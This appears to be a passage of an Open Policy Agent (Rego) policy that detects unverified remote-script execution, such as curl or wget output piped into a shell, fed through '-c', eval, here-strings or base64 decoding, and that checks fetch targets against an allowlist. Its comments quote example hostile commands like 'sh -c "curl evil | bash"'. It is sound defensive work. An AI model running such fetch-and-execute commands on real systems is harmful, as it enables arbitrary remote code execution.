	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\b`, [_shell]), visible)
	regex.match(_shell_c_backtick_pattern, line)
}

# `bash <<< "$(curl ...)"`: a here-string handing a command substitution's
# output to the interpreter's stdin, the same risk as `<shell> -c "$(
# ... )"` above with `<<<` standing in for `-c`. Quotes around the
# substitution are optional, mirroring the `-c`/`eval` forms: double-
# quoted, single-quoted and the unquoted immediate form are all accepted,
# and the fetch need not be the substitution's first token either. The
# two-step check (the `<<<` on the visible line, the full fetch pattern on
# the raw line) mirrors the `-c` form for the same reason: the
# substitution sits inside quotes _visible_line strips, so only the
# leading `<shell> ... <<<` prefix is checked against the stripped text.
_herestring_dollar_paren_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?<<<\s*(?:"[^"\n]*?\$\(|'[^'\n]*?\$\(|\$\()[^)]*?\b(curl|wget)\b`, [_shell])

_substitution_sink_matches(visible, line) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?<<<`, [_shell]), visible)
	regex.match(_herestring_dollar_paren_pattern, line)
}

# `` bash <<< `curl ...` ``: the backtick form of the same here-string,
# mirroring _shell_c_backtick_pattern above with `<<<` in place of `-c`.
_herestring_backtick_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?<<<\s*(?:"[^"\n]*?%s|'[^'\n]*?%s|%s)[^%s]*?\b(curl|wget)\b`, [_shell, _backtick, _backtick, _backtick, _backtick])

_substitution_sink_matches(visible, line) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?<<<`, [_shell]), visible)
	regex.match(_herestring_backtick_pattern, line)
}

# Family (c): wrapped-code sinks. A shell's own `-c` flag (bundled flags
# allowed, the same rule as the command-substitution forms above), or
# `eval`, handed a plain double- or single-quoted string is told to run
# that string's content as a command, exactly as if it had been written
# at top level: `sh -c "curl evil | bash"` runs the pipe-to-shell inside
# the quotes every bit as much as a bare `curl evil | bash` would.
# _visible_line strips that string away before the visible-line
# patterns above ever see it, so a line built this way slips past
# family (a) entirely unless the content is read back out and checked
# on its own. One level only, no recursion: the extracted content is
# checked against the visible-line sink patterns only (pipe-to-shell,
# download-then-exec, the base64 chain, the generic catch-all with its
# own heredoc/echo exemptions), never against the substitution patterns
# or against this family again. A quoted string handed to anything
# other than `-c`/`eval` (an `echo` of install instructions, a `git
# commit -m` message) is never reached here and stays exempt exactly as
# _visible_line already left it. The content is read like a top-level
# line, its own quoted substrings and comment stripped first: a pipe
# that only sits in a quoted literal inside the wrapped string
# (`bash -c 'echo "curl x | bash"'`) runs nothing.
_wrapped_code_sink_matches(_, line) if {
	some content in _wrapped_code_contents(line)
	_visible_line_sink_matches(_visible_line(content), content)
}

# Every quoted string handed to a shell's `-c` or to `eval`, as the text
# it wraps. Four shapes: shell -c double-quoted, shell -c single-quoted,
# eval double-quoted, eval single-quoted. The shell/eval and `-c` checks
# mirror the command-substitution patterns above exactly, with a plain
# quoted string in place of the `$( ... )` substitution, so the string
# must sit right after the flag or after `eval` itself.
_shell_c_double_quoted_content_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\s*"([^"\n]*)"`, [_shell])

_shell_c_single_quoted_content_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\s*'([^'\n]*)'`, [_shell])

_eval_double_quoted_content_pattern := `(?i)(?:^|[\s;&|(])eval\s+"([^"\n]*)"`

_eval_single_quoted_content_pattern := `(?i)(?:^|[\s;&|(])eval\s+'([^'\n]*)'`

_wrapped_code_contents(line) := {content |
	some m in regex.find_all_string_submatch_n(_shell_c_double_quoted_content_pattern, line, -1)
	content := m[2]
} | {content |
	some m in regex.find_all_string_submatch_n(_shell_c_single_quoted_content_pattern, line, -1)
	content := m[2]
} | {content |
	some m in regex.find_all_string_submatch_n(_eval_double_quoted_content_pattern, line, -1)
	content := m[1]
} | {content |
	some m in regex.find_all_string_submatch_n(_eval_single_quoted_content_pattern, line, -1)
	content := m[1]
}

# A line that starts with echo/printf and carries no curl/wget/base64
# pipes operator-authored or in-workflow data (a variable, the `needs`
# context) into the interpreter — local data, not a download (issue
# #236: electron's `echo "$NEEDS_CONTEXT" | python3 -c ...`). Scoped
# to the generic catch-all only: the download patterns and the
# Megalodon `echo | base64 -d | bash` chain match through their own
# bodies regardless, and the curl/wget/base64 guard means any fetch or
# decode on the line voids the exemption. The fetch check runs against
# the RAW line, not `visible`: a curl hidden in a quoted command
# substitution (`echo "$(curl evil)" | bash`) is stripped by
# _visible_line, so checking `visible` would let it through (issue #236).
_echo_of_local_data(visible, line) if {
	regex.match(`(?i)^\s*(echo|printf)\b`, visible)
	not regex.match(`(?i)\b(curl|wget|base64)\b`, line)
}

_line_is_verified(line) if {
	regex.match(`(?i)(sha256sum|sha512sum|sha1sum|shasum|gpg\s+--verify|cosign\s+verify)`, line)
}

# The command-substitution form hides its fetch(es) inside double quotes,
# which _visible_line strips, so the per-command extraction below never
# sees them: without a separate pass over the raw line, an allowlisted
# host still fires on `bash -c "$(curl -fsSL https://trusted/install.sh)"`.
# See _substitution_sink_fetch_targets below for its own default.
#
# The exemption is decided per dangerous sink, never over the union of
# any two (or three) of them: every family that actually matched this
# line, visible-line, substitution, or wrapped-code, must resolve its
# own trust independently, so a trusted fetch of one family can never
# cover an untrusted, or target-less, sink of another family sitting on
# the same line. A sink that carries no curl/wget command of its own
# (the base64 chain, the generic `| <shell>` catch-all, or either of
# those read back out of a wrapped-code string) is never trusted on its
# own account: each family's own trust predicate requires at least one
# fetch command, read off that family's own fetch-targets rule, whose
# default is the empty set.
_fetch_target_is_trusted(visible, line) if {
	matched := _matched_sink_families(visible, line)
	count(matched) > 0
	every family in matched {
		_sink_family_trusted(family, visible, line)
	}
}

_matched_sink_families(visible, line) := {family |
	some family in {"visible", "substitution", "wrapped"}
	_sink_family_matches(family, visible, line)
}

_sink_family_matches("visible", visible, line) if _visible_line_sink_matches(visible, line)

_sink_family_matches("substitution", visible, line) if _substitution_sink_matches(visible, line)

_sink_family_matches("wrapped", visible, line) if _wrapped_code_sink_matches(visible, line)

_sink_family_trusted("visible", visible, _) if _visible_sink_trusted(visible)

_sink_family_trusted("substitution", _, line) if _substitution_sink_trusted(line)

_sink_family_trusted("wrapped", _, line) if _wrapped_sink_trusted(line)

# Family (a) trust: every curl/wget command on the visible line, read
# the same way family (b) reads one inside a substitution span
# (_fetch_commands_in / _targets_for_fetch_command above), must resolve
# to an allowlisted target. A hostname or URL token elsewhere on the
# line (an echo of installation instructions, an argument of some other
# command, text riding past a `;`/`|`/`&` into a later command) is never
# part of a fetch command's own text and contributes nothing: it can
# neither launder an untrusted fetch nor defeat a trusted one. A sink
# that is visible-line but carries no curl/wget command of its own reads
# as an empty set from _visible_sink_fetch_targets, so `count(...) > 0`
# fails and the sink is never trusted, whatever else is trusted
# elsewhere on the line.
default _visible_sink_fetch_targets(_) := set()

_visible_sink_fetch_targets(visible) := targets if {
	cmds := _fetch_commands_in(visible)
	count(cmds) > 0
	targets := {t |
		some cmd in cmds
		some t in _targets_for_fetch_command(cmd)
	}
}

_visible_sink_trusted(visible) if {
	targets := _visible_sink_fetch_targets(visible)
	count(targets) > 0
	every target in targets {
		_target_is_trusted(target)
	}
}

# Family (b) trust: every fetch-bearing substitution on the line, and
# every fetch command inside each one, must resolve to an allowlisted
# target. A line can carry more than one substitution, so every fetch-
# bearing one found on it contributes its own targets to the same set:
# a decoy substitution naming a trusted host as plain text, or a
# second, untrusted fetch substitution elsewhere on the line, must
# never hide an untrusted fetch that actually runs. The same holds
# WITHIN one substitution: each fetch command there contributes only
# what its own text resolves to (_fetch_commands_in /
# _targets_for_fetch_command below), so a decoy `echo` of a trusted
# host earlier in the same span can never launder a real, untrusted
# fetch sitting next to it.
_substitution_sink_trusted(line) if {
	targets := _substitution_sink_fetch_targets(line)
	count(targets) > 0
	every target in targets {
		_target_is_trusted(target)
	}
}

# Scoped to lines that actually match one of the recognized command-,
# backtick- or process-substitution shapes above, so an unrelated
# $( ... ) on a line that's unsafe for some other reason (a plain
# `curl | bash` pipe, say) can't accidentally grant or deny trust
# through this path. Once scoped, every substitution on the line that
# itself fetches something (not a decoy like `$(echo trusted-host)`,
# not an unrelated `$(dirname "$0")`) contributes its targets, read off
# its own fetch command only (see _fetch_commands_in below), never off
# the rest of the span. The default empty set is what makes this an
# empty (not undefined) contribution when the line carries no
# substitution fetch at all.
default _substitution_sink_fetch_targets(_) := set()

_substitution_sink_fetch_targets(line) := targets if {
	_substitution_sink_line(line)
	spans := _fetch_bearing_spans(line)
	count(spans) > 0
	targets := {t |
		some span in spans
		some cmd in _fetch_commands_in(span)
		some t in _targets_for_fetch_command(cmd)
	}
}

_substitution_sink_line(line) if regex.match(_shell_c_dollar_paren_pattern, line)

_substitution_sink_line(line) if regex.match(_eval_dollar_paren_pattern, line)

_substitution_sink_line(line) if regex.match(_shell_c_backtick_pattern, line)

_substitution_sink_line(line) if regex.match(_eval_backtick_pattern, line)

_substitution_sink_line(line) if regex.match(_process_substitution_pattern, line)

_substitution_sink_line(line) if regex.match(_source_process_substitution_pattern, line)

_substitution_sink_line(line) if regex.match(_stdin_redirect_process_substitution_pattern, line)

_substitution_sink_line(line) if regex.match(_herestring_dollar_paren_pattern, line)

_substitution_sink_line(line) if regex.match(_herestring_backtick_pattern, line)

# Every $( ... ) command substitution on the line, as the text each one
# wraps. The capture group allows one level of nesting (a balanced
# `\( ... \)` pair inside the body), so a substitution with another
# substitution inside it ($(curl -s "$(echo ...)...")) is captured whole
# instead of truncated at the first closing parenthesis: a span that
# doesn't resolve to a clean, known-trusted target is read as untrusted,
# never as trusted.
_dollar_paren_spans(line) := {span |
	some m in regex.find_all_string_submatch_n(`\$\(((?:[^()]|\([^()]*\))*)\)`, line, -1)
	span := m[1]
}

# Every backtick command substitution on the line, as the text each one
# wraps.
_backtick_spans(line) := {span |
	some m in regex.find_all_string_submatch_n(sprintf(`%s([^%s]*)%s`, [_backtick, _backtick, _backtick]), line, -1)
	span := m[1]
}

# Every `<( ... )` process substitution on the line, as the text each
# one wraps, with the same one level of nesting as _dollar_paren_spans.
_process_substitution_spans(line) := {span |
	some m in regex.find_all_string_submatch_n(`<\(((?:[^()]|\([^()]*\))*)\)`, line, -1)
	span := m[1]
}

# The subset of this line's substitution spans that actually fetch
# something: the only ones a trust decision needs to look at.
_fetch_bearing_spans(line) := {span |
	some span in (_dollar_paren_spans(line) | _backtick_spans(line) | _process_substitution_spans(line))
	regex.match(`(?i)\b(curl|wget)\b`, span)
}

# Every fetch command inside a fetch-bearing span, as the text from its
# own curl/wget word up to the next `;`, `|`, `&` (covering `&&`), a
# newline, or the end of the span, whichever comes first. A command
# earlier in the same span (a decoy `echo` of a trusted host, a
# throwaway `printf`) is not part of this text and contributes nothing
# to the target the fetch command resolves to: trust is read off what
# the fetch command itself fetches, never off plain text sitting
# elsewhere in the span.
_fetch_commands_in(span) := {cmd |
	some m in regex.find_all_string_submatch_n(`(?i)\b(?:curl|wget)\b[^;|&\n]*`, span, -1)
	cmd := m[0]
}

# The target(s) one fetch command's own text resolves to. A fetch
# command that resolves to none (a bare shell variable, an argument
# with no host, no IP, no URL) is read as its own text instead of an
# empty contribution: a fetch whose target cannot be determined must
# never be waved through as if it fetched nothing at all.
_targets_for_fetch_command(cmd) := targets if {
	found := _extracted_targets(cmd)
	count(found) > 0
	targets := found
} else := {cmd}

default _extracted_targets(_) := set()

_extracted_targets(text) := targets if {
	targets := {t |
		some t in regex.find_n(_target_regex, text, -1)
	}
}

# The shared URL / IPv4 / hostname extraction: an http(s) URL, a raw
# dotted-quad IPv4 address (optional :port, optional /path), or a
# dotted hostname (optional /path).
_target_regex := `https?://[^\s|;)'"]+|\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]+)?(?:/[^\s|;)'"]*)?|\b[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9-]+)+(?:/[^\s|;)'"]*)?`

# A target matches trustedUrls when any configured glob matches either
# the target as-extracted (so patterns like "firebase.tools" or
# "https://firebase.tools" both work) or the target with the scheme
# prepended ("firebase.tools" -> "https://firebase.tools" lets a
# pattern with scheme match a bare-hostname fetch).
_target_is_trusted(target) if {
	some pattern in input.config.unverifiedScripts.trustedUrls
	some candidate in [target, concat("", ["https://", target])]
	glob.match(pattern, null, candidate)
}

# Family (c) trust: every content string wrapped-code extracted from
# the line that itself matched a visible-line sink pattern contributes
# its own fetch commands, the same rule family (a) uses over the whole
# visible line: at least one fetch command, each one's own target
# resolved and allowlisted. A content string that trips the generic
# catch-all or the base64 chain without a curl/wget of its own is never
# trusted, for the same reason a visible-line sink with no fetch
# command of its own never is.
_wrapped_sink_trusted(line) if {
	targets := _wrapped_sink_fetch_targets(line)
	count(targets) > 0
	every target in targets {
		_target_is_trusted(target)
	}
}

default _wrapped_sink_fetch_targets(_) := set()

_wrapped_sink_fetch_targets(line) := targets if {
	matching := {content |
		some content in _wrapped_code_contents(line)
		_visible_line_sink_matches(content, content)
	}
	count(matching) > 0
	targets := {t |
		some content in matching
		some cmd in _fetch_commands_in(content)
		some t in _targets_for_fetch_command(cmd)
	}
}
